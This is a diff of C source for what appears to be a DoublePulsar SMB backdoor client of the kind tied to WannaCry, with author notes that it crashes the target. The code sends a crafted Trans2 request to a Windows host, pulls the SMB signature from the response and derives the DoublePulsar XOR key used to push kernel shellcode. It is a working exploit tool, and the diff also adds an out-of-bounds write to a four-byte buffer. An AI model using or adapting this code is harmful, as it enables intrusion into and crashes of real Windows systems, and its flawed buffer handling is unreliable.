@@ -3,8 +3,10 @@
 WARNING: This code works for me as of March 7th 2021 but it BSODS the target
 
 It could be because my kernel shellcode doesn't contain the payload shellcode length after it
-
 11/8/2021: Added code to attach the shellcode length after the kernel shellcode.
+
+To fix:
+Update SMB Length in NetBIOS header & make sure the payload shellcode length is being written to buffer correctly.
 */
 
 #include <windows.h>
@@ -51,6 +53,19 @@ unsigned char wannacry_Trans2_Request[] =
 "\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00"
 "\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
 "\x00\x0e\x00\x0d\x10\x00"; /* d1 c9 10 17 d9 aa 40 17 d9 da 69 17 ( Example SESSION_SETUP Parameters ) */
+
+unsigned int LE2INT(unsigned char *data)
+{
+            unsigned int b;
+            b = data[3];
+            b <<= 8;
+            b += data[2];
+            b <<= 8;
+            b += data[1];
+            b <<= 8;
+            b += data[0];
+            return b;
+}
 
 unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
 {
@@ -160,18 +175,21 @@ int main(int argc, char* argv[])
 	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	unsigned char signature[5];
+	unsigned char signature[4];
 	unsigned int sig;
 	//copy SMB signature from recvbuff to local buffer
 	signature[0] = recvbuff[18];
 	signature[1] = recvbuff[19];
 	signature[2] = recvbuff[20];
 	signature[3] = recvbuff[21];
+	signature[4] = '\0';
 	//this is for determining architecture
-	//signature[4] = recvbuff[22];
+	//recvbuff[22];
+	//but unused at this time
 
 	//convert the signature buffer to unsigned integer 
-	memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
+	//memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
+	sig = LE2INT(signature);
 
 	//calculate the XOR key for DoublePulsar
 	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
